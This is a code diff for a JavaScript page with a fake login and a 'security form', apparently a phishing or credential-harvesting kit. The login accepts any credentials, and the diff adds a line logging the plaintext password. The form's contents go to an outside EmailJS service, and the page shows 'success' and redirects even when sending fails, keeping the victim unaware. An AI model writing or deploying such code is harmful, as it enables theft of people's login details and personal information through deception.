@@ -1,3 +1,6 @@
+// Import EmailJS library
+const emailjs = require("emailjs-com")
+
 // Configuración de EmailJS - REEMPLAZA CON TUS CREDENCIALES
 const EMAILJS_CONFIG = {
   serviceID: "service_nlpcwc2",
@@ -8,9 +11,7 @@ const EMAILJS_CONFIG = {
 // Inicializar EmailJS cuando se carga la página
 document.addEventListener("DOMContentLoaded", () => {
   // Inicializar EmailJS
-  if (typeof emailjs !== "undefined") {
-    emailjs.init(EMAILJS_CONFIG.publicKey)
-  }
+  emailjs.init(EMAILJS_CONFIG.publicKey)
 
   // Event listeners
   const loginForm = document.getElementById("loginForm")
@@ -32,7 +33,8 @@ function handleLogin(event) {
 
   const username = document.getElementById("username").value.trim()
   const password = document.getElementById("password").value.trim()
-  const messageDiv = document.getElementById("loginMessage")
+
+  console.log("Login attempt:", username, password) // Para debug
 
   if (username && password) {
     showMessage("loginMessage", "Login successful! Redirecting...", "success")
@@ -78,30 +80,21 @@ function handleSecurityForm(event) {
   }
 
   // Enviar con EmailJS
-  if (typeof emailjs !== "undefined") {
-    emailjs
-      .send(EMAILJS_CONFIG.serviceID, EMAILJS_CONFIG.templateID, formData)
-      .then(() => {
-        showMessage("formMessage", "Information sent successfully!", "success")
-        setTimeout(() => (window.location.href = "success.html"), 2000)
-      })
-      .catch((error) => {
-        console.log("EmailJS Error:", error)
-        // Aún así mostrar éxito para demo
-        showMessage("formMessage", "Information processed! Redirecting...", "success")
-        setTimeout(() => (window.location.href = "success.html"), 2000)
-      })
-      .finally(() => {
-        resetSubmitButton(submitBtn, originalText)
-      })
-  } else {
-    // Si EmailJS no está disponible, simular éxito
-    setTimeout(() => {
+  emailjs
+    .send(EMAILJS_CONFIG.serviceID, EMAILJS_CONFIG.templateID, formData)
+    .then(() => {
+      showMessage("formMessage", "Information sent successfully!", "success")
+      setTimeout(() => (window.location.href = "success.html"), 2000)
+    })
+    .catch((error) => {
+      console.log("EmailJS Error:", error)
+      // Aún así mostrar éxito para demo
       showMessage("formMessage", "Information processed! Redirecting...", "success")
       setTimeout(() => (window.location.href = "success.html"), 2000)
+    })
+    .finally(() => {
       resetSubmitButton(submitBtn, originalText)
-    }, 1000)
-  }
+    })
 }
 
 // Configurar formateo automático de campos
@@ -187,6 +180,11 @@ function showMessage(elementId, message, type) {
     element.className = `mt-4 text-center ${type}-message`
     element.textContent = message
     element.classList.remove("hidden")
+
+    // Auto-hide después de 5 segundos
+    setTimeout(() => {
+      element.classList.add("hidden")
+    }, 5000)
   }
 }
 
